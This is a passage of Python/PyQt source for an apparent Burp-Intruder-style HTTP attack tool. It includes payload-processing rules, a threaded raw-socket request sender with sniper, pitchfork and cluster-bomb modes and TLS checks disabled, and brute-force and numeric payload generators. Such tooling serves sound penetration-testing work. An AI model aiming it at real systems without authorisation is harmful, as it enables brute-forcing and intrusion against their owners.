        type_row.addWidget(self.type_combo)
        root.addLayout(type_row)

        # ── Parameters frame ──────────────────────────────────────────────────
        self.params_frame = QFrame()
        self.params_frame.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};border:1px solid {COLOR_BORDER};border-radius:4px;"
        )
        self.params_layout = QVBoxLayout(self.params_frame)
        self.params_layout.setContentsMargins(10, 8, 10, 8)
        self.params_layout.setSpacing(6)
        root.addWidget(self.params_frame)

        self._update_params_ui(self._rule.get("type", ""))
        self.type_combo.currentTextChanged.connect(self._update_params_ui)

        # ── Live preview ──────────────────────────────────────────────────────
        prev_row = QHBoxLayout()
        prev_lbl = QLabel("Preview  ('test'):")
        prev_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        self.preview_edit = QLineEdit()
        self.preview_edit.setReadOnly(True)
        self.preview_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;"
            f"padding:3px 6px;font-family:monospace;"
        )
        prev_row.addWidget(prev_lbl)
        prev_row.addWidget(self.preview_edit)
        root.addLayout(prev_row)
        self._update_preview()

        # ── Enabled checkbox ──────────────────────────────────────────────────
        self.enabled_cb = QCheckBox("Rule enabled")
        self.enabled_cb.setChecked(self._rule.get("enabled", True))
        self.enabled_cb.setStyleSheet(f"color:{COLOR_TEXT};")
        root.addWidget(self.enabled_cb)

        # ── Dialog buttons ────────────────────────────────────────────────────
        btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        btns.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 14px;}}"
            f"QPushButton:hover{{background:{COLOR_HOVER};}}"
        )
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)
        root.addWidget(btns)

    # ── Param UI helpers ──────────────────────────────────────────────────────

    def _clear_params(self):
        while self.params_layout.count():
            item = self.params_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
            elif item.layout():
                self._clear_layout(item.layout())
        self._param_widgets = {}

    def _clear_layout(self, layout):
        while layout.count():
            item = layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()

    def _add_text_field(self, label: str, key: str, default: str = "", placeholder: str = ""):
        row = QHBoxLayout()
        lbl = QLabel(label)
        lbl.setFixedWidth(self._LABEL_WIDTH)
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:12px;")
        edit = QLineEdit(default)
        edit.setPlaceholderText(placeholder)
        edit.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;"
            f"padding:3px 6px;font-family:monospace;"
        )
        edit.textChanged.connect(self._update_preview)
        row.addWidget(lbl)
        row.addWidget(edit)
        self.params_layout.addLayout(row)
        self._param_widgets[key] = edit
        return edit

    def _update_params_ui(self, rtype: str):
        self._clear_params()
        p = self._rule.get("params", {}) if self._rule.get("type") == rtype else {}

        if rtype == "Add Prefix":
            self._add_text_field("Prefix:", "value", p.get("value", ""), "text to prepend")
        elif rtype == "Add Suffix":
            self._add_text_field("Suffix:", "value", p.get("value", ""), "text to append")
        elif rtype == "Match / Replace":
            self._add_text_field("Match:", "match", p.get("match", ""), "literal or regex")
            self._add_text_field("Replace:", "replace", p.get("replace", ""), "replacement (\\1 for groups)")
            cb_row = QHBoxLayout()
            cb = QCheckBox("Use regular expression")
            cb.setChecked(bool(p.get("is_regex", False)))
            cb.setStyleSheet(f"color:{COLOR_TEXT};font-size:12px;")
            cb.stateChanged.connect(self._update_preview)
            cb_row.addWidget(cb)
            cb_row.addStretch()
            self.params_layout.addLayout(cb_row)
            self._param_widgets["is_regex_cb"] = cb
        elif rtype == "Substring":
            self._add_text_field("Start index:", "start", str(p.get("start", 0)), "0-based, inclusive")
            self._add_text_field("End index:", "end", str(p.get("end", "") if p.get("end") is not None else ""), "exclusive – leave blank = to end")
        else:
            hint = QLabel("No parameters required.")
            hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
            self.params_layout.addWidget(hint)

        self._update_preview()

    def _update_preview(self):
        if not hasattr(self, "preview_edit"):
            return
        try:
            result = apply_rule("test", self._build_rule())
        except Exception as e:
            result = f"<error: {e}>"
        self.preview_edit.setText(repr(result))

    def _build_rule(self) -> dict:
        rtype  = self.type_combo.currentText()
        params: Dict[str, Any] = {}
        if rtype in ("Add Prefix", "Add Suffix"):
            params["value"] = self._param_widgets.get("value", QLineEdit()).text()
        elif rtype == "Match / Replace":
            params["match"]    = self._param_widgets.get("match",   QLineEdit()).text()
            params["replace"]  = self._param_widgets.get("replace", QLineEdit()).text()
            cb = self._param_widgets.get("is_regex_cb")
            params["is_regex"] = cb.isChecked() if cb else False
        elif rtype == "Substring":
            params["start"] = self._param_widgets.get("start", QLineEdit()).text()
            end_val = self._param_widgets.get("end", QLineEdit()).text().strip()
            params["end"] = end_val if end_val else None
        enabled = self.enabled_cb.isChecked() if hasattr(self, "enabled_cb") else True
        return {"type": rtype, "params": params, "enabled": enabled}

    def get_rule(self) -> dict:
        return self._build_rule()


# ─────────────────────────────────────────────────────────────────────────────
# Payload Processing Panel
# ─────────────────────────────────────────────────────────────────────────────

class PayloadProcessingPanel(QWidget):
    """Ordered list of processing rules applied to every payload before sending."""

    _BTN = (
        f"background:{COLOR_ELEVATED_BG};color:{{color}};border:1px solid {COLOR_BORDER};"
        f"border-radius:4px;padding:3px 10px;font-size:12px;"
    )

    def __init__(self, parent=None):
        super().__init__(parent)
        self._rules: List[dict] = []
        self._setup_ui()

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 4, 0, 0)
        root.setSpacing(4)

        # ── Header bar ────────────────────────────────────────────────────────
        hdr = QFrame()
        hdr.setStyleSheet(
            f"background:{COLOR_ELEVATED_BG};border:1px solid {COLOR_BORDER};border-radius:4px;"
        )
        hdr.setFixedHeight(26)
        hdr_l = QHBoxLayout(hdr)
        hdr_l.setContentsMargins(8, 2, 8, 2)
        title = QLabel("⚙  Payload Processing")
        title.setStyleSheet(f"color:{COLOR_ACCENT};font-weight:700;font-size:12px;letter-spacing:0.5px;")
        hdr_l.addWidget(title)
        hdr_l.addStretch()
        hint = QLabel("Rules applied in order to each payload →")
        hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        hdr_l.addWidget(hint)
        root.addWidget(hdr)

        # ── Rule list ─────────────────────────────────────────────────────────
        self.rule_list = QListWidget()
        self.rule_list.setMaximumHeight(120)
        self.rule_list.setStyleSheet(f"""
            QListWidget {{
                background:{COLOR_DARK_BG};color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER};border-radius:4px;
                font-size:12px;font-family:monospace;
            }}
            QListWidget::item:selected {{ background:{COLOR_HOVER};color:{COLOR_TEXT_BRIGHT}; }}
            QListWidget::item:hover    {{ background:{COLOR_ELEVATED_BG}; }}
        """)
        self.rule_list.setDragDropMode(QAbstractItemView.InternalMove)
        self.rule_list.model().rowsMoved.connect(self._sync_from_list)
        self.rule_list.itemDoubleClicked.connect(self._edit_rule)
        self.rule_list.setContextMenuPolicy(Qt.CustomContextMenu)
        self.rule_list.customContextMenuRequested.connect(self._context_menu)
        root.addWidget(self.rule_list)

        # ── Buttons ───────────────────────────────────────────────────────────
        btn_row = QHBoxLayout()
        btn_row.setSpacing(4)

        def _btn(label, color, slot, fixed_w=None):
            b = QPushButton(label)
            b.setStyleSheet(self._BTN.format(color=color))
            b.clicked.connect(slot)
            if fixed_w:
                b.setFixedWidth(fixed_w)
            return b

        btn_row.addWidget(_btn("＋ Add Rule",  COLOR_ACCENT,    self._add_rule))
        btn_row.addWidget(_btn("Edit",         COLOR_TEXT,       self._edit_rule))
        btn_row.addWidget(_btn("Remove",       COLOR_CRITICAL,   self._remove_rule))
        btn_row.addWidget(_btn("▲", COLOR_TEXT, self._move_up,   28))
        btn_row.addWidget(_btn("▼", COLOR_TEXT, self._move_down, 28))
        btn_row.addStretch()
        btn_row.addWidget(_btn("Clear All",    COLOR_TEXT_MUTED, self._clear_rules))
        root.addLayout(btn_row)

    # ── Rule list helpers ─────────────────────────────────────────────────────

    def _rule_label(self, rule: dict) -> str:
        rtype   = rule.get("type", "")
        p       = rule.get("params", {})
        enabled = rule.get("enabled", True)
        icon    = "✓" if enabled else "✗"
        if rtype == "Add Prefix":
            return f"{icon}  Add Prefix: {repr(p.get('value', ''))}"
        elif rtype == "Add Suffix":
            return f"{icon}  Add Suffix: {repr(p.get('value', ''))}"
        elif rtype == "Match / Replace":
            flag = " [regex]" if p.get("is_regex") else ""
            return f"{icon}  Match/Replace: {repr(p.get('match',''))} → {repr(p.get('replace',''))}{flag}"
        elif rtype == "Substring":
            s = p.get("start", 0)
            e = p.get("end") or ""
            return f"{icon}  Substring[{s}:{e}]"
        return f"{icon}  {rtype}"

    def _refresh(self):
        self.rule_list.clear()
        for rule in self._rules:
            item = QListWidgetItem(self._rule_label(rule))
            item.setData(Qt.UserRole, rule)
            if not rule.get("enabled", True):
                item.setForeground(QBrush(QColor(COLOR_TEXT_MUTED)))
            self.rule_list.addItem(item)

    def _sync_from_list(self):
        self._rules = [
            self.rule_list.item(i).data(Qt.UserRole)
            for i in range(self.rule_list.count())
            if self.rule_list.item(i).data(Qt.UserRole)
        ]

    # ── CRUD callbacks ────────────────────────────────────────────────────────

    def _add_rule(self):
        dlg = ProcessingRuleDialog(parent=self)
        if dlg.exec_() == QDialog.Accepted:
            self._rules.append(dlg.get_rule())
            self._refresh()

    def _edit_rule(self, item=None):
        row = self.rule_list.row(item) if isinstance(item, QListWidgetItem) else self.rule_list.currentRow()
        if not (0 <= row < len(self._rules)):
            return
        dlg = ProcessingRuleDialog(rule=self._rules[row], parent=self)
        if dlg.exec_() == QDialog.Accepted:
            self._rules[row] = dlg.get_rule()
            self._refresh()

    def _remove_rule(self):
        row = self.rule_list.currentRow()
        if 0 <= row < len(self._rules):
            self._rules.pop(row)
            self._refresh()

    def _move_up(self):
        row = self.rule_list.currentRow()
        if row > 0:
            self._rules[row], self._rules[row - 1] = self._rules[row - 1], self._rules[row]
            self._refresh()
            self.rule_list.setCurrentRow(row - 1)

    def _move_down(self):
        row = self.rule_list.currentRow()
        if row < len(self._rules) - 1:
            self._rules[row], self._rules[row + 1] = self._rules[row + 1], self._rules[row]
            self._refresh()
            self.rule_list.setCurrentRow(row + 1)

    def _clear_rules(self):
        self._rules.clear()
        self._refresh()

    def _toggle_enabled(self, row: int):
        if 0 <= row < len(self._rules):
            self._rules[row]["enabled"] = not self._rules[row].get("enabled", True)
            self._refresh()

    def _context_menu(self, pos):
        row = self.rule_list.row(self.rule_list.itemAt(pos))
        if row < 0:
            return
        menu = QMenu(self)
        menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
            f"QMenu::item:selected{{background:{COLOR_HOVER};}}"
        )
        enabled = self._rules[row].get("enabled", True)
        toggle_act = menu.addAction("Disable rule" if enabled else "Enable rule")
        edit_act   = menu.addAction("Edit rule")
        menu.addSeparator()
        del_act = menu.addAction("Remove rule")
        action = menu.exec_(self.rule_list.viewport().mapToGlobal(pos))
        if action == toggle_act:
            self._toggle_enabled(row)
        elif action == edit_act:
            self._edit_rule(self.rule_list.item(row))
        elif action == del_act:
            self._remove_rule()

    # ── Public API ────────────────────────────────────────────────────────────

    def get_rules(self) -> List[dict]:
        return list(self._rules)

    def apply_to(self, payloads: List[str]) -> List[str]:
        return apply_processing(payloads, self._rules)


# ─────────────────────────────────────────────────────────────────────────────
# Attack Thread
# ─────────────────────────────────────────────────────────────────────────────

class IntruderAttackThread(QThread):
    result_row    = pyqtSignal(dict)   # one result per request
    progress      = pyqtSignal(int, int)  # done, total
    status_update = pyqtSignal(str)
    attack_done   = pyqtSignal()
    error_signal  = pyqtSignal(str)

    def __init__(
        self,
        host: str, port: int, use_ssl: bool,
        template: str,
        positions: List[Tuple[int, int]],   # list of (start, end) byte offsets in template
        payload_sets: List[List[str]],
        attack_type: str = "sniper",
        timeout: int = 10,
        threads: int = 5,
        delay_ms: int = 0,
        grep_extract: str = "",
        follow_redirects: bool = False,
        send_baseline: bool = True,
    ):
        super().__init__()
        self.host             = host
        self.port             = port
        self.use_ssl          = use_ssl
        self.template         = template
        self.positions        = positions
        self.payload_sets     = payload_sets
        self.attack_type      = attack_type
        self.timeout          = timeout
        self.max_threads      = threads
        self.delay_ms         = delay_ms
        self.grep_extract     = grep_extract
        self.follow_redirects = follow_redirects
        self.send_baseline    = send_baseline
        self._stop_flag       = threading.Event()
        self._lock            = threading.Lock()
        self._sent            = 0
        self._total           = 0
        self._sem             = None

    def stop(self):
        self._stop_flag.set()

    def run(self):
        try:
            # ── Baseline request (unmodified template, #0) ────────────────
            if self.send_baseline and not self._stop_flag.is_set():
                self.status_update.emit("Sending baseline request…")
                start = time.time()
                resp, err = self._http_send(self.template)
                elapsed = (time.time() - start) * 1000
                status = ""
                m = re.match(r'HTTP/\S+\s+(\d+)', resp or "")
                if m:
                    status = m.group(1)
                body = ""
                if resp and "\r\n\r\n" in resp:
                    body = resp.split("\r\n\r\n", 1)[1]
                elif resp and "\n\n" in resp:
                    body = resp.split("\n\n", 1)[1]
                grep_match = ""
                if self.grep_extract and resp:
                    gm = re.search(self.grep_extract, resp, re.IGNORECASE | re.DOTALL)
                    if gm:
                        grep_match = gm.group(0)[:100]
                self.result_row.emit({
                    "#":        0,
                    "payload":  "(baseline)",
                    "status":   status,
                    "length":   len(body),
                    "time":     f"{elapsed:.0f}",
                    "error":    err or "",
                    "grep":     grep_match,
                    "request":  self.template,
                    "response": resp or "",
                    "_baseline": True,
                })

            combos = list(self._build_combos())
            self._total = len(combos)
            self._sem   = threading.Semaphore(self.max_threads)
            threads     = []

            for idx, payloads in enumerate(combos):
                if self._stop_flag.is_set():
                    break
                if self.delay_ms > 0:
                    time.sleep(self.delay_ms / 1000.0)
                self._sem.acquire()
                t = threading.Thread(
                    target=self._send_one,
                    args=(idx + 1, payloads),
                    daemon=True
                )
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

            self.attack_done.emit()

        except Exception as e:
            self.error_signal.emit(str(e))

    def _build_combos(self) -> Iterator[List[str]]:
        n_pos  = len(self.positions)
        n_sets = len(self.payload_sets)

        if self.attack_type == "sniper":
            # One payload set; iterate each position independently
            pset = self.payload_sets[0] if self.payload_sets else []
            for pos_i in range(n_pos):
                for payload in pset:
                    combo = [""] * n_pos
                    combo[pos_i] = payload
                    yield combo

        elif self.attack_type == "battering_ram":
            pset = self.payload_sets[0] if self.payload_sets else []
            for payload in pset:
                yield [payload] * n_pos

        elif self.attack_type == "pitchfork":
            sets = [self.payload_sets[i] if i < n_sets else [] for i in range(n_pos)]
            for combo in zip(*sets):
                yield list(combo)

        elif self.attack_type == "cluster_bomb":
            sets = [self.payload_sets[i] if i < n_sets else [""] for i in range(n_pos)]
            for combo in itertools.product(*sets):
                yield list(combo)

    def _build_request(self, payloads: List[str]) -> str:
        """Replace position markers with payloads."""
        result = list(self.template)
        # positions are (start, end) char indices using §…§ markers
        # After parsing, positions hold plain indices in the clean template
        # We do a simple substitution on the cleaned template
        # (positions already computed by the UI parser)
        offset = 0
        for i, (s, e) in enumerate(self.positions):
            p = payloads[i] if i < len(payloads) else ""
            result[s + offset: e + offset] = list(p)
            offset += len(p) - (e - s)
        return "".join(result)

    def _send_one(self, req_num: int, payloads: List[str]):
        try:
            raw = self._build_request(payloads)
            start = time.time()
            resp, err = self._http_send(raw)
            elapsed = (time.time() - start) * 1000

            # Parse status
            status = ""
            m = re.match(r'HTTP/\S+\s+(\d+)', resp or "")
            if m:
                status = m.group(1)

            # Length
            body = ""
            if resp and "\r\n\r\n" in resp:
                body = resp.split("\r\n\r\n", 1)[1]
            elif resp and "\n\n" in resp:
                body = resp.split("\n\n", 1)[1]
            length = len(body)

            # Grep
            grep_match = ""
            if self.grep_extract and resp:
                gm = re.search(self.grep_extract, resp, re.IGNORECASE | re.DOTALL)
                if gm:
                    grep_match = gm.group(0)[:100]

            row = {
                "#":         req_num,
                "payload":   " | ".join(payloads),
                "status":    status,
                "length":    length,
                "time":      f"{elapsed:.0f}",
                "error":     err or "",
                "grep":      grep_match,
                "request":   raw,
                "response":  resp or "",
            }
            self.result_row.emit(row)
        except Exception as e:
            self.result_row.emit({"#": req_num, "payload": str(payloads), "status": "ERR", "length": 0, "time": "0", "error": str(e), "grep": "", "request": "", "response": ""})
        finally:
            with self._lock:
                self._sent += 1
                self.progress.emit(self._sent, self._total)
            self._sem.release()

    @staticmethod
    def _dechunk(data: bytes) -> bytes:
        """Decode an HTTP/1.1 chunked-transfer-encoded body into raw bytes.

        Chunk format:  <hex-size>\\r\\n<size bytes of data>\\r\\n ... 0\\r\\n\\r\\n
        Trailing headers (after the terminating 0-size chunk) are ignored.
        Falls back to returning the original data unchanged if it doesn't
        parse as valid chunked encoding, rather than raising.
        """
        out = bytearray()
        pos = 0
        n = len(data)
        try:
            while pos < n:
                line_end = data.find(b"\r\n", pos)
                if line_end == -1:
                    break
                size_line = data[pos:line_end].split(b";", 1)[0].strip()
                if not size_line:
                    break
                chunk_size = int(size_line, 16)
                if chunk_size == 0:
                    break
                chunk_start = line_end + 2
                chunk_end = chunk_start + chunk_size
                out.extend(data[chunk_start:chunk_end])
                pos = chunk_end + 2  # skip trailing \r\n after chunk data
            return bytes(out) if out else data
        except (ValueError, IndexError):
            # Not actually chunked / malformed — return untouched
            return data

    def _http_send(self, raw: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)

            if "\r\n\r\n" in raw:
                header_part, body_part = raw.split("\r\n\r\n", 1)
            elif "\n\n" in raw:
                header_part, body_part = raw.split("\n\n", 1)
            else:
                header_part, body_part = raw, ""

            header_lines = header_part.strip().splitlines()
            if header_lines:
                if "HTTP/2" in header_lines[0]:
                    header_lines[0] = re.sub(r'HTTP/2(?:\.0)?', 'HTTP/1.1', header_lines[0])
                
                # Force Connection: close to avoid hanging on keep-alive
                has_connection = False
                for i in range(1, len(header_lines)):
                    if header_lines[i].lower().startswith("connection:"):
                        header_lines[i] = "Connection: close"
                        has_connection = True
                        break
                if not has_connection:
                    header_lines.append("Connection: close")

            # ── Re-compute Content-Length after payload substitution ──────────
            # The original header may have the pre-injection length (e.g. 25).
            # Sending a stale Content-Length causes servers to read a truncated
            # body and return 400 "parameter missing".
            body_bytes = body_part.encode("utf-8", errors="replace")
            has_cl = False
            for i in range(1, len(header_lines)):
                if header_lines[i].lower().startswith("content-length:"):
                    header_lines[i] = f"Content-Length: {len(body_bytes)}"
                    has_cl = True
                    break
            if not has_cl and body_bytes:
                header_lines.append(f"Content-Length: {len(body_bytes)}")

            norm_raw = "\r\n".join(header_lines) + "\r\n\r\n" + body_part
            sock.sendall(norm_raw.encode("utf-8", errors="replace"))
            chunks = []
            sock.settimeout(self.timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
            except socket.timeout:
                pass
            finally:
                sock.close()
            
            raw_resp = b"".join(chunks)
            
            # Handle GZIP decompression
            headers_part = b""
            body_part = b""
            sep = b""
            
            if b"\r\n\r\n" in raw_resp:
                sep = b"\r\n\r\n"
                headers_part, body_part = raw_resp.split(sep, 1)
            elif b"\n\n" in raw_resp:
                sep = b"\n\n"
                headers_part, body_part = raw_resp.split(sep, 1)
            else:
                headers_part = raw_resp

            try:
                h_str = headers_part.decode("utf-8", errors="ignore")

                # Un-chunk the body first if Transfer-Encoding: chunked was used.
                # Without this, the leading chunk-size line (e.g. "246\r\n") gets
                # passed straight into gzip.decompress() and fails silently,
                # leaving the raw chunked+gzipped bytes shown as garbage text.
                if re.search(r'transfer-encoding:\s*chunked', h_str, re.IGNORECASE) and body_part:
                    body_part = self._dechunk(body_part)

                if re.search(r'content-encoding:\s*gzip', h_str, re.IGNORECASE) and body_part:
                    try:
                        body_part = gzip.decompress(body_part)
                    except Exception as dec_err:
                        logger.warning("gzip decompression failed: %s", dec_err)
            except Exception:
                pass

            h_text = headers_part.decode("utf-8", errors="replace")
            b_text = body_part.decode("utf-8", errors="replace")
            
            if sep:
                resp_text = h_text + sep.decode("utf-8") + b_text
            else:
                resp_text = h_text + b_text
                
            return resp_text, None
        except Exception as e:
            return None, str(e)


# ─────────────────────────────────────────────────────────────────────────────
# Payload Config Panel
# ─────────────────────────────────────────────────────────────────────────────

class PayloadConfigPanel(QWidget):
    """Config widget for one payload set."""

    def __init__(self, set_number: int = 1, parent=None):
        super().__init__(parent)
        self.set_number = set_number
        self._setup_ui()

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(6)

        # Source selector
        src_row = QHBoxLayout()
        src_row.addWidget(QLabel(f"  Payload Set {self.set_number}  –  Source:"))
        self.source_combo = QComboBox()
        self.source_combo.addItems(["Simple List", "Numbers", "Brute Force", "Built-in List"])
        self.source_combo.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px 8px;")
        self.source_combo.currentTextChanged.connect(self._on_source_change)
        src_row.addWidget(self.source_combo)
        src_row.addStretch()
        root.addLayout(src_row)

        # ── Built-in list selector row (shown only when source = Built-in List) ──
        self.builtin_row = QFrame()
        self.builtin_row.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border:1px solid {COLOR_BORDER};border-radius:4px;")
        builtin_rl = QHBoxLayout(self.builtin_row)
        builtin_rl.setContentsMargins(6, 4, 6, 4)
        builtin_rl.setSpacing(6)
        bl_icon = QLabel("📋")
        bl_label = QLabel("Select list:")
        bl_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:12px;")
        self.builtin_combo = QComboBox()
        self.builtin_combo.addItems(sorted(BUILTIN_LISTS.keys()))
        self.builtin_combo.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px 8px;min-width:220px;")
        self.builtin_combo.currentTextChanged.connect(self._load_builtin_to_editor)
        self.builtin_count_label = QLabel()
        self.builtin_count_label.setStyleSheet(f"color:{COLOR_ACCENT};font-size:11px;")
        builtin_rl.addWidget(bl_icon)
        builtin_rl.addWidget(bl_label)
        builtin_rl.addWidget(self.builtin_combo)
        builtin_rl.addWidget(self.builtin_count_label)
        builtin_rl.addStretch()
        self.builtin_row.setVisible(False)
        root.addWidget(self.builtin_row)

        # ── Stacked pages ─────────────────────────────────────────────────────
        self.pages = QTabWidget()
        self.pages.tabBar().hide()
        self.pages.setStyleSheet("QTabWidget::pane{border:none;}")

        # Page 0: Simple list
        simple_page = QWidget()
        sl = QVBoxLayout(simple_page)
        sl.setContentsMargins(0, 0, 0, 0)
        self.simple_list_edit = QPlainTextEdit()
        self.simple_list_edit.setPlaceholderText("One payload per line…")
        self.simple_list_edit.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};font-family:monospace;font-size:12px;border:1px solid {COLOR_BORDER};border-radius:4px;")
        self.simple_list_edit.setMaximumHeight(180)
        btn_row = QHBoxLayout()
        load_btn = QPushButton("Load from file")
        load_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 12px;font-size:12px;")
        load_btn.clicked.connect(self._load_from_file)
        clear_btn = QPushButton("Clear")
        clear_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_CRITICAL};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 12px;font-size:12px;")
        clear_btn.clicked.connect(self.simple_list_edit.clear)
        dedupe_btn = QPushButton("Deduplicate")
        dedupe_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 12px;font-size:12px;")
        dedupe_btn.clicked.connect(self._deduplicate)
        btn_row.addWidget(load_btn)
        btn_row.addWidget(clear_btn)
        btn_row.addWidget(dedupe_btn)
        btn_row.addStretch()
        count_lbl_row = QHBoxLayout()
        self.count_label = QLabel("0 payloads")
        self.count_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        count_lbl_row.addWidget(self.count_label)
        count_lbl_row.addStretch()
        self.simple_list_edit.textChanged.connect(self._update_count)
        sl.addWidget(self.simple_list_edit)
        sl.addLayout(btn_row)
        sl.addLayout(count_lbl_row)
        self.pages.addTab(simple_page, "Simple")

        # Page 1: Numbers
        num_page = QWidget()
        nl = QHBoxLayout(num_page)
        nl.addWidget(QLabel("From:"))
        self.num_from = QSpinBox(); self.num_from.setRange(-99999999, 99999999); self.num_from.setValue(0)
        self.num_from.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        nl.addWidget(self.num_from)
        nl.addWidget(QLabel("To:"))
        self.num_to = QSpinBox(); self.num_to.setRange(-99999999, 99999999); self.num_to.setValue(100)
        self.num_to.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        nl.addWidget(self.num_to)
        nl.addWidget(QLabel("Step:"))
        self.num_step = QSpinBox(); self.num_step.setRange(1, 99999); self.num_step.setValue(1)
        self.num_step.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        nl.addWidget(self.num_step)
        nl.addStretch()
        self.pages.addTab(num_page, "Numbers")

        # Page 2: Brute Force
        bf_page = QWidget()
        bfl = QVBoxLayout(bf_page)
        row1 = QHBoxLayout()
        row1.addWidget(QLabel("Charset:"))
        self.bf_charset = QLineEdit("abcdefghijklmnopqrstuvwxyz0123456789")
        self.bf_charset.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px;")
        row1.addWidget(self.bf_charset)
        bfl.addLayout(row1)
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Min len:"))
        self.bf_min = QSpinBox(); self.bf_min.setRange(1, 8); self.bf_min.setValue(1)
        self.bf_min.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        row2.addWidget(self.bf_min)
        row2.addWidget(QLabel("Max len:"))
        self.bf_max = QSpinBox(); self.bf_max.setRange(1, 8); self.bf_max.setValue(3)
        self.bf_max.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        row2.addWidget(self.bf_max)
        row2.addStretch()
        bfl.addLayout(row2)
        self.pages.addTab(bf_page, "BruteForce")

        root.addWidget(self.pages)

        # ── Payload Processing ────────────────────────────────────────────────
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"color:{COLOR_BORDER};")
        root.addWidget(sep)
        self.processing_panel = PayloadProcessingPanel()
        root.addWidget(self.processing_panel)

    def _on_source_change(self, text: str):
        is_builtin = (text == "Built-in List")
        self.builtin_row.setVisible(is_builtin)
        if is_builtin:
            self._load_builtin_to_editor()
            self.pages.setCurrentIndex(0)
        else:
            idx = {"Simple List": 0, "Numbers": 1, "Brute Force": 2}.get(text, 0)
            self.pages.setCurrentIndex(idx)

    def _load_builtin_to_editor(self):
        name = self.builtin_combo.currentText()
        payloads = BUILTIN_LISTS.get(name, [])
        self.simple_list_edit.blockSignals(True)
        self.simple_list_edit.setPlainText("\n".join(str(p) for p in payloads))
        self.simple_list_edit.blockSignals(False)
        self.builtin_count_label.setText(f"{len(payloads):,} payloads")
        self._update_count()

    def _load_from_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Payload File", "", "Text files (*.txt);;All files (*)")
        if path:
            try:
                with open(path, "r", encoding="utf-8", errors="replace") as f:
                    self.simple_list_edit.setPlainText(f.read())
            except Exception as e:
                QMessageBox.warning(self, "Error", str(e))

    def _deduplicate(self):
        lines = self.simple_list_edit.toPlainText().splitlines()
        seen, unique = set(), []
        for l in lines:
            if l not in seen:
                seen.add(l)
                unique.append(l)
        self.simple_list_edit.setPlainText("\n".join(unique))

    def _update_count(self):
        n = len([l for l in self.simple_list_edit.toPlainText().splitlines() if l])
        self.count_label.setText(f"{n:,} payloads")

    def get_payloads(self) -> List[str]:
        src = self.source_combo.currentText()
        if src in ("Simple List", "Built-in List"):
            # Built-in lists are loaded into the editor, so read from there;
            # this also preserves any user edits made after loading.
            raw = [l for l in self.simple_list_edit.toPlainText().splitlines() if l]
        elif src == "Numbers":
            raw = list(gen_numbers(self.num_from.value(), self.num_to.value(), self.num_step.value()))
        elif src == "Brute Force":
            raw = list(gen_brute_force(self.bf_charset.text(), self.bf_min.value(), self.bf_max.value()))
        else:
            raw = []
        return self.processing_panel.apply_to(raw)


# ─────────────────────────────────────────────────────────────────────────────
# Results Table – Row Delegate
# ─────────────────────────────────────────────────────────────────────────────

class _RowDelegate(QStyledItemDelegate):
    """
    Fully custom painter that draws background and selection manually, then
    asks Qt to render text/icons only (with State_Selected stripped).
    This bypasses the QSS ::item:selected rule that would otherwise ignore
